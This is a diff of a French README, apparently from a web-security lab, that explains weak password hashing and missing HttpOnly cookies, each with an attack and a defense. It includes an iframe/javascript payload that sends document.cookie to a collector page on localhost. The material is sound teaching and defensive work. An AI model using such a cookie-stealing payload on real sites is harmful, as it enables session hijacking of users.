@@ -22,15 +22,15 @@ De cette manière un attaquant peut facilement retrouver le mot de passe grâce 
 http://localhost:port/atk_password.php?password=admin123<br/>
 **Defense :**<br/>
 Pour générer un nouveau mot de passe nous avons utilisé le code suivant :<br/>
-`<$salt = bin2hex(openssl_random_pseudo_bytes(22));>`<br/>
-`<$hash = crypt($_GET['password'], "$2a$12$".$salt);>`<br/>
+`$salt = bin2hex(openssl_random_pseudo_bytes(22));`<br/>
+`$hash = crypt($_GET['password'], "$2a$12$".$salt);`<br/>
 De cette manière un salt est généré aléatoirement pour chaque mot de passe et l’utilisation de rainbow tables devient plus compliqué.<br/>
 <br/>
 ## Session HttpOnly
 HttpOnly est un attribut des cookies qui permet d’indiquer aux navigateurs de ne pas laisser des scripts avoir accès aux cookies depuis le DOM. Le site vulnérable n’implémente pas HttpOnly.<br/>
 **Attaque :**<br/>
 L’attaquant a déposé un lien permettant d’envoyer une requête contenant les cookies sur un site malveillant. HttpOnly est désactivé.<br/>
-`<<iframe src="javascript:document.location='http://localhost:8089/bad_session_httponly.php?cookie='+document.cookie"></iframe>>`<br/>
+`<iframe src="javascript:document.location='http://localhost:8089/bad_session_httponly.php?cookie='+document.cookie"></iframe>`<br/>
 **Defense :**<br/>
 Pour protéger ce site de ce genre d’attaque, il faut préciser aux navigateurs d’utiliser HttpOnly. De cette manière, un attaquant ne pourra pas récupérer des données contenues dans les cookies.<br/>
 <br/>
